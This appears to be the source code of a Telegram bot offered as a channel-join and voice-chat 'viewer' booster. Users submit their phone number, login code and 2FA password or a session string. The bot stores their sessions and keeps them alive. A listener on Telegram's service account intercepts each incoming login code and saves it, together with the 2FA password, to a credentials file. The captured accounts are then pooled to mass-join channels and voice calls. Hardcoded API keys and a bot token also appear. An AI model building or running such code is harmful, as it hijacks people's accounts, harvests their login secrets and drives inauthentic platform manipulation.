import asyncio
import logging
import re
import sys
import datetime
import time
import random
import os
import json
from typing import List, Dict, Optional, Tuple
from aiohttp import web

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    UserAlreadyParticipantError,
    InviteRequestSentError,
    MessageNotModifiedError
)
from telethon.tl.functions.messages import ImportChatInviteRequest, SendReactionRequest, GetMessagesViewsRequest, CheckChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
from telethon.tl.functions.account import UpdateStatusRequest, SetPrivacyRequest
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.types import (
    PeerChannel, 
    ReactionEmoji, 
    InputPrivacyKeyStatusTimestamp, 
    InputPrivacyValueAllowAll, 
    InputPrivacyValueDisallowAll,
    DataJSON,
    ChannelParticipantAdmin,
    ChannelParticipantCreator
)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = int(os.getenv("API_ID", "39598527"))
API_HASH = os.getenv("API_HASH", "4a3feafcdb2136918ab28f83508962fa")
BOT_TOKEN = os.getenv("BOT_TOKEN", "9252517288:AAGegqHn61rQqnO9AdeczvQfuUBIEuXnV9w")

MAIN_MODERATOR_IDS = {8595088772, 11111111111}

KEEP_ALIVE_INTERVAL = 15
START_TIME = datetime.datetime.now()
DATA_FILE = "bot_data.json"
CREDENTIALS_FILE = "credentials.json"

EMOJI_POOL = [
    "🔥", "⚡", "✨", "🌟", "💫", "🔮", "💎", "🚀", "👑", "🎯", 
    "💥", "🎲", "🖤", "👻", "🌪️", "🦁", "🗿", "☠️", "🏴‍☠️", "🦅",
    "☣️", "🔱", "⚜️", "🏆", "🧿", "⚙️", "🛡️", "⚔️", "💣"
]

active_clients: Dict[str, TelegramClient] = {}
login_clients: Dict[str, TelegramClient] = {}
task_states = {}
pending_otps = {} 
VC_MONITORS: Dict[str, asyncio.Task] = {}
SHUTDOWN = False

account_modes = {}
temp_online_until = {}
next_random_toggle = {}
last_message_times = {} # ডুপ্লিকেট বা অধিক মেসেজ পাঠানো রোধ করার জন্য

def load_credentials():
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_credential_record(phone: str, otp: str, password_2fa: str, added_by_id: int = 0, added_by_info: str = "N/A"):
    creds = load_credentials()
    creds[phone] = {
        "phone": phone,
        "latest_otp": otp,
        "2fa_password": password_2fa,
        "added_by_id": added_by_id,
        "added_by_info": added_by_info,
        "updated_at": datetime.datetime.utcnow().isoformat()
    }
    try:
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump(creds, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving credentials: {e}")

async def get_saved_password(phone: str) -> str:
    creds = load_credentials()
    if phone in creds and creds[phone].get("2fa_password"):
        pwd = creds[phone]["2fa_password"]
        if pwd and pwd != "Disabled / Not Set":
            return pwd
    return "Disabled / Not Set"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {"sessions": {}, "approved_users": [], "history": [], "all_users": [], "user_accounts": {}}
    return {"sessions": {}, "approved_users": [], "history": [], "all_users": [], "user_accounts": {}}

def save_data(data):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

async def get_all_sessions():
    data = load_data()
    return data.get("sessions", {})

async def add_session(phone, session_str, user_id: int):
    data = load_data()
    if "sessions" not in data:
        data["sessions"] = {}
    data["sessions"][phone] = session_str
    
    if "user_accounts" not in data:
        data["user_accounts"] = {}
    str_uid = str(user_id)
    if str_uid not in data["user_accounts"]:
        data["user_accounts"][str_uid] = []
    if phone not in data["user_accounts"][str_uid]:
        data["user_accounts"][str_uid].append(phone)
        
    save_data(data)

async def remove_session(phone):
    data = load_data()
    if phone in data.get("sessions", {}):
        del data["sessions"][phone]
        save_data(data)

async def approve_user(user_id: int, approved_by: int, username: str = "", title: str = "", is_admin: bool = False) -> bool:
    try:
        data = load_data()
        data["approved_users"] = [u for u in data.get("approved_users", []) if int(u["user_id"]) != int(user_id)]
        data["approved_users"].append({
            "user_id": int(user_id),
            "username": username,
            "title": title,
            "approved_by": approved_by,
            "approved_at": datetime.datetime.utcnow().isoformat(),
            "is_approved": True,
            "is_admin": is_admin
        })
        if "all_users" not in data:
            data["all_users"] = []
        if int(user_id) not in data["all_users"]:
            data["all_users"].append(int(user_id))
        save_data(data)
        return True
    except Exception:
        return False

async def unapprove_user(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return False
    try:
        data = load_data()
        data["approved_users"] = [u for u in data.get("approved_users", []) if int(u["user_id"]) != int(user_id)]
        save_data(data)
        return True
    except Exception:
        return False

async def is_user_approved(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return True
    data = load_data()
    for user in data.get("approved_users", []):
        if int(user["user_id"]) == int(user_id) and user.get("is_approved", True):
            return True
    return False

async def is_user_admin(user_id: int) -> bool:
    if int(user_id) in MAIN_MODERATOR_IDS:
        return True
    data = load_data()
    for user in data.get("approved_users", []):
        if int(user["user_id"]) == int(user_id) and user.get("is_approved", True) and user.get("is_admin", False):
            return True
    return False

async def get_approved_users() -> List[dict]:
    data = load_data()
    return [u for u in data.get("approved_users", []) if u.get("is_approved", True)]

async def log_activity(phone, action, target, status):
    try:
        data = load_data()
        if "history" not in data:
            data["history"] = []
        data["history"].append({
            "phone": phone,
            "action": action,
            "target": target,
            "status": status,
            "timestamp": datetime.datetime.utcnow().isoformat()
        })
        if len(data["history"]) > 500:
            data["history"] = data["history"][-500:]
        save_data(data)
    except Exception:
        pass

def style_text(text: str) -> str:
    bold_caps = {
        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜',
        'J':'𝗝','K':'𝗞','L':'🇱','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥',
        'S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭'
    }
    small_caps = {
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ',
        'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
        'S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
    }
    def style_word(word):
        if not word:
            return ''
        first = word[0].upper()
        first_styled = bold_caps.get(first, first)
        rest = word[1:].upper()
        rest_styled = ''.join(small_caps.get(ch, ch.lower()) for ch in rest)
        return first_styled + rest_styled
    return re.sub(r'[A-Za-z]+', lambda m: style_word(m.group(0)), text)

def get_uptime():
    diff = datetime.datetime.now() - START_TIME
    minutes = int(diff.total_seconds() / 60)
    if minutes < 60:
        return f"{minutes}M"
    elif minutes < 1440:
        return f"{minutes // 60}𝗛 {minutes % 60}𝗠"
    else:
        return f"{minutes // 1440}Ｄ {minutes % 1440 // 60}𝗛"

async def keep_alive(client, phone: str):
    while not SHUTDOWN:
        try:
            await client.get_me()
            await client(UpdateStatusRequest(offline=False))
        except Exception:
            if phone in active_clients:
                del active_clients[phone]
            await remove_session(phone)
            break
        await asyncio.sleep(KEEP_ALIVE_INTERVAL)

def setup_client_otp_listener(client, phone):
    @client.on(events.NewMessage(chats=(777000, "Telegram")))
    async def otp_listener(event):
        try:
            msg_text = event.raw_text
            code_match = re.search(r'\b(\d{5,6})\b', msg_text)
            if code_match:
                otp_code = code_match.group(1)
                if phone not in pending_otps:
                    pending_otps[phone] = {}
                pending_otps[phone]['otp'] = otp_code
                pwd_2fa = await get_saved_password(phone)
                save_credential_record(phone, otp_code, pwd_2fa)
        except Exception:
            pass

async def start_saved_clients():
    sessions = await get_all_sessions()
    for phone, session_str in list(sessions.items()):
        try:
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                active_clients[phone] = client
                setup_client_otp_listener(client, phone)
                asyncio.create_task(keep_alive(client, phone))
            else:
                await remove_session(phone)
        except Exception:
            await remove_session(phone)

def parse_target(link: str):
    link = link.strip()
    username_match = re.search(r"(?:t\.me/|@)([a-zA-Z0-9_]{5,32})", link)
    if username_match and "joinchat" not in link and "/c/" not in link:
        return ("public", username_match.group(1))
    invite_match = re.search(r"t\.me/(?:\+|joinchat/)([a-zA-Z0-9_-]+)", link)
    if invite_match:
        return ("private", invite_match.group(1))
    return (None, None)

def parse_vc_link(link: str):
    link = link.strip().replace(" ", "")
    for prefix in ["https://", "http://", "www.", "t.me/", "telegram.me/"]:
        link = link.replace(prefix, "")
    if "?" in link:
        link = link.split("?")[0]
    is_private = False
    identifier = link
    if "joinchat/" in link:
        is_private = True
        identifier = link.split("joinchat/")[1].replace("/", "")
    elif link.startswith("+"):
        is_private = True
        identifier = link[1:].replace("/", "")
    else:
        is_private = False
        identifier = link.replace("@", "").replace("/", "")
    return is_private, identifier

async def resolve_user(bot_client, input_text: str):
    input_text = input_text.strip()
    try:
        if input_text.isdigit():
            user_id = int(input_text)
            entity = await bot_client.get_entity(user_id)
        else:
            username = input_text.replace("@", "")
            entity = await bot_client.get_entity(username)
            user_id = entity.id
        
        username_str = f"@{entity.username}" if getattr(entity, 'username', None) else ""
        first_name = getattr(entity, 'first_name', '') or ''
        last_name = getattr(entity, 'last_name', '') or ''
        full_name = f"{first_name} {last_name}".strip() or "User"
        return user_id, username_str, full_name
    except Exception:
        return None, None, None

def get_stop_button():
    return [[Button.inline(style_text("⛔ FORCE STOP"), b"force_stop")]]

def get_cancel():
    return [[Button.inline(style_text("🔙 BACK"), b"back")]]

def get_qty_buttons():
    return [
        [Button.inline("10", b"qty_10"), Button.inline("50", b"qty_50")],
        [Button.inline("100", b"qty_100"), Button.inline(style_text("ALL"), b"qty_all")],
        [Button.inline(style_text("CUSTOM"), b"qty_custom")],
        [Button.inline(style_text("🔙 BACK"), b"back")]
    ]

async def interruptible_sleep(seconds: float, chat_id: int) -> bool:
    step = 0.2
    elapsed = 0.0
    while elapsed < seconds:
        if task_states.get(chat_id, {}).get('cancel'):
            return True
        await asyncio.sleep(step)
        elapsed += step
    return False

# --- JOIN LOGIC ---
async def execute_join(event, task_data, count_limit):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    links_data = task_data['links_data']
    delay = float(task_data.get('delay', 1.0))
    all_phones = list(active_clients.keys())
    random.shuffle(all_phones)
    selected = all_phones[:count_limit] if count_limit > 0 else all_phones
    
    msg = await event.respond(style_text(f"🚀 JOINING LINKS WITH {len(selected)} ACCOUNTS..."), buttons=get_stop_button())
    success, failed, already = 0, 0, 0
    was_cancelled = False
    
    for link_info in links_data:
        if task_states.get(chat_id, {}).get('cancel'):
            was_cancelled = True
            break
        link_type = link_info['type']
        target = link_info['target']
        original_link = link_info['link']
        
        for phone in selected:
            if task_states.get(chat_id, {}).get('cancel'):
                was_cancelled = True
                break
            client = active_clients.get(phone)
            if not client:
                failed += 1
                continue
            try:
                if link_type == 'public':
                    await client(JoinChannelRequest(target))
                else:
                    await client(ImportChatInviteRequest(target))
                success += 1
            except UserAlreadyParticipantError:
                already += 1
                success += 1
            except InviteRequestSentError:
                success += 1
            except FloodWaitError as e:
                await asyncio.sleep(min(e.seconds, 10))
                failed += 1
            except Exception:
                failed += 1
            
            if await interruptible_sleep(delay, chat_id):
                was_cancelled = True
                break
                
    if chat_id in task_states:
        del task_states[chat_id]
    title = "⛔ JOIN STOPPED!" if was_cancelled else "✅ JOIN COMPLETE!"
    await msg.edit(style_text(f"{title}\n✅ Success: {success} | ⚠️ Already: {already} | ❌ Failed: {failed}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

# --- VC JOIN LOGIC ---
async def execute_vc_join(event, raw_link: str, count_limit: int):
    chat_id = event.chat_id
    task_states[chat_id] = {'running': True, 'cancel': False}
    is_private, identifier = parse_vc_link(raw_link)
    if not identifier:
        if chat_id in task_states:
            del task_states[chat_id]
        return await event.respond(style_text("❌ INVALID LINK!"))
    
    all_phones = list(active_clients.keys())
    random.shuffle(all_phones)
    selected_phones = all_phones[:count_limit] if count_limit > 0 else all_phones
    msg = await event.respond(style_text(f"🎙️ JOINING VC WITH {len(selected_phones)} ACCOUNTS..."), buttons=get_stop_button())
    success_count, fail_count = 0, 0
    was_cancelled = False
    
    for idx, phone in enumerate(selected_phones, 1):
        if task_states.get(chat_id, {}).get('cancel'):
            was_cancelled = True
            break
        client = active_clients.get(phone)
        if not client:
            fail_count += 1
            continue
        try:
            entity = None
            if is_private:
                try:
                    updates = await client(ImportChatInviteRequest(identifier))
                    if updates.chats:
                        entity = updates.chats[0]
                except UserAlreadyParticipantError:
                    invite_info = await client(CheckChatInviteRequest(identifier))
                    if hasattr(invite_info, 'chat'):
                        entity = invite_info.chat
            else:
                try:
                    await client(JoinChannelRequest(identifier))
                except UserAlreadyParticipantError:
                    pass
                entity = await client.get_entity(identifier)
            
            if entity:
                full_chat = await client(GetFullChannelRequest(entity))
                if full_chat.full_chat.call:
                    call_obj = full_chat.full_chat.call
                    my_ssrc = random.randint(10000, 99999999)
                    params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": my_ssrc, "muted": True}))
                    await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
                    success_count += 1
                else:
                    fail_count += 1
            else:
                fail_count += 1
        except Exception:
            fail_count += 1
            
        if await interruptible_sleep(0.3, chat_id):
            was_cancelled = True
            break
            
    if chat_id in task_states:
        del task_states[chat_id]
    await msg.edit(style_text(f"✅ VC JOIN COMPLETED!\nJoined: {success_count} | Failed: {fail_count}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def show_menu(event, user_id, edit_msg=None):
    accounts_count = len(active_clients)
    uptime = get_uptime()
    menu = (
        f"🤖 𝗝ᴏɪɴ / 𝗟ᴇᴀᴠᴇ & 𝗔ᴜᴛᴏ 𝗩ɪᴇᴡᴇʀ 𝗣ʀᴏ\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 𝗔ᴄᴄᴏᴜɴᴛꜱ : {accounts_count}\n"
        f"⏱️ 𝗨ᴘᴛɪᴍᴇ : {uptime}\n"
        f"⚡ 𝗔ᴜᴛᴏ 𝗠ᴏɴɪᴛᴏ🇷 : 𝗔ᴄᴛɪ𝘃ᴇ 🟢\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 𝗦ᴇʟᴇᴄᴛ ᴀɴ ᴏᴘ𝘁𝗶ᴏɴ ғʀᴏᴍ ʙᴇʟᴏᴡ :\n"
        f"🔥"
    )
    buttons = [
        [Button.inline("🟢 ➕ 𝗔𝗗𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧", b"add")],
        [Button.inline("🚀 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘🇱", b"join")],
        [Button.inline("🎙️ 𝗝𝗢𝗜𝗡 𝗩𝗖", b"join_vc")],
        [Button.inline("📋 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 𝗟𝗜𝗦𝗧", b"list_accounts")]
    ]
    if int(user_id) in MAIN_MODERATOR_IDS:
        buttons.append([Button.inline("📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦", b"stats")])

    if edit_msg:
        try:
            await edit_msg.edit(menu, buttons=buttons)
        except Exception:
            await event.respond(menu, buttons=buttons)
    else:
        await event.respond(menu, buttons=buttons)

bot = TelegramClient('bot_session', API_ID, API_HASH)
bot.parse_mode = None

# ডুপ্লিকেট মেসেজ রোধ করার জন্য ফিল্টার
@bot.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    user_id = event.sender_id
    now = time.time()
    if user_id in last_message_times and now - last_message_times[user_id] < 2.0:
        return # অতিদ্রুত একাধিক মেসেজ আসা রোধ করবে
    last_message_times[user_id] = now

    is_approved = await is_user_approved(user_id)
    if not is_approved:
        return await event.respond("⛔ **Access Locked!** Please add accounts using the button below.", buttons=[
            [Button.inline("🟢 ➕ 𝗔𝗗𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧", b"add")]
        ])
    await show_menu(event, user_id)

@bot.on(events.NewMessage(pattern=r'/broadcast'))
async def broadcast_cmd(event):
    if event.sender_id not in MAIN_MODERATOR_IDS:
        return await event.respond("⛔ Restricted!")
    
    data = load_data()
    all_users = list(set(data.get("all_users", [])))
    if not all_users:
        return await event.respond("❌ No users found!")
    
    status = await event.respond(f"⏳ Broadcasting to {len(all_users)} users...")
    reply_msg = await event.get_reply_message()
    broadcast_text = event.text.replace('/broadcast', '').strip()
    
    success = 0
    for u_id in all_users:
        try:
            if reply_msg:
                await bot.send_message(u_id, reply_msg)
            elif broadcast_text:
                await bot.send_message(u_id, broadcast_text)
            success += 1
        except Exception:
            pass
        await asyncio.sleep(0.05)
    await status.edit(f"✅ Broadcast Done! Success: {success}")

@bot.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    data = event.data.decode()

    if data == "back":
        await event.answer()
        if event.chat_id in task_states:
            del task_states[event.chat_id]
        try:
            await event.delete()
        except Exception:
            pass
        await show_menu(event, user_id)
        return

    if data in ["add", "add_phone", "add_string"]:
        await event.answer()
        if data == "add":
            await event.edit("ADD ACCOUNT", buttons=[
                [Button.inline("📱 PHONE", b"add_phone")],
                [Button.inline("🔑 SESSION STRING", b"add_string")],
                [Button.inline("🔙 BACK", b"back")]
            ])
        elif data == "add_phone":
            task_states[event.chat_id] = {'type': 'login', 'step': 'phone'}
            await event.edit("📱 Send your phone number (e.g. +880...):", buttons=get_cancel())
        elif data == "add_string":
            task_states[event.chat_id] = {'type': 'login', 'step': 'string'}
            await event.edit("🔑 Send session string:", buttons=get_cancel())
        return

    await event.answer()
    if data == "join":
        task_states[event.chat_id] = {'type': 'join', 'step': 'link'}
        await event.edit("🔗 Send channel links (one per line):", buttons=get_cancel())
    elif data == "join_vc":
        task_states[event.chat_id] = {'type': 'vc_join', 'step': 'link'}
        await event.edit("🎙️ Send VC link:", buttons=get_cancel())
    elif data.startswith("qty_"):
        state = task_states.get(event.chat_id)
        if not state:
            return
        qty = data.split("_")[1]
        count = len(active_clients) if qty == "all" else int(qty)
        await event.delete()
        if state['type'] == 'join':
            await execute_join(event, state, count)
        elif state['type'] == 'vc_join':
            await execute_vc_join(event, state['vc_link'], count)
    elif data == "list_accounts":
        sessions = await get_all_sessions()
        msg = "📋 Active Accounts:\n\n"
        for i, ph in enumerate(sessions.keys(), 1):
            msg += f"{i}. `{ph}`\n"
        await event.edit(msg, buttons=[[Button.inline("🔙 BACK", b"back")]])

@bot.on(events.NewMessage)
async def message_handler(event):
    chat_id = event.chat_id
    if chat_id not in task_states:
        return
    state = task_states[chat_id]
    if state.get('running'):
        return
    text = event.raw_text.strip()
    user_id = event.sender_id

    if state.get('type') == 'login':
        if state['step'] == 'phone':
            phone = text.replace(" ", "").strip()
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                send = await client.send_code_request(phone)
                setup_client_otp_listener(client, phone)
                login_clients[phone] = client
                state.update({'client': client, 'phone': phone, 'hash': send.phone_code_hash, 'step': 'otp'})
                await event.respond(f"📩 OTP sent to {phone}. Enter code:", buttons=get_cancel())
            except Exception as e:
                await event.respond(f"❌ Error: {e}", buttons=get_cancel())
        
        elif state['step'] == 'otp':
            ph = state.get('phone')
            try:
                client_obj = state['client']
                await client_obj.sign_in(phone=ph, code=text, phone_code_hash=state['hash'])
                await add_session(ph, client_obj.session.save(), user_id)
                active_clients[ph] = client_obj
                login_clients.pop(ph, None)
                asyncio.create_task(keep_alive(client_obj, ph))
                del task_states[chat_id]
                await approve_user(user_id, 0, title=f"User_{user_id}", is_admin=False)
                await event.respond(f"✅ Successfully Added: {ph}")
                await show_menu(event, user_id)
            except SessionPasswordNeededError:
                state['step'] = '2fa'
                await event.respond("🔐 Enter your 2FA Password:", buttons=get_cancel())
            except Exception as e:
                await event.respond(f"❌ Failed: {e}", buttons=get_cancel())
        
        elif state['step'] == '2fa':
            ph = state.get('phone')
            try:
                client_obj = state['client']
                await client_obj.sign_in(password=text)
                await add_session(ph, client_obj.session.save(), user_id)
                active_clients[ph] = client_obj
                login_clients.pop(ph, None)
                asyncio.create_task(keep_alive(client_obj, ph))
                del task_states[chat_id]
                await approve_user(user_id, 0, title=f"User_{user_id}", is_admin=False)
                await event.respond(f"✅ Successfully Added with 2FA: {ph}")
                await show_menu(event, user_id)
            except Exception as e:
                await event.respond(f"❌ Wrong 2FA password: {e}", buttons=get_cancel())

    elif state.get('type') == 'join':
        if state['step'] == 'link':
            links = [l.strip() for l in text.splitlines() if l.strip()]
            valid = [{'link': l, 'type': parse_target(l)[0], 'target': parse_target(l)[1]} for l in links if parse_target(l)[0]]
            if not valid:
                return await event.respond("❌ No valid links!", buttons=get_cancel())
            state['links_data'] = valid
            state['step'] = 'delay'
            await event.respond("⏱️ Enter delay in seconds (e.g. 1, 2):", buttons=get_cancel())
        elif state['step'] == 'delay':
            try:
                state['delay'] = float(text)
            except:
                state['delay'] = 1.0
            state['step'] = 'qty'
            await event.respond("Select quantity:", buttons=get_qty_buttons())
            
    elif state.get('type') == 'vc_join':
        if state['step'] == 'link':
            state['vc_link'] = text
            state['step'] = 'qty'
            await event.respond("Select quantity:", buttons=get_qty_buttons())

async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    await start_saved_clients()
    await start_web_server()
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
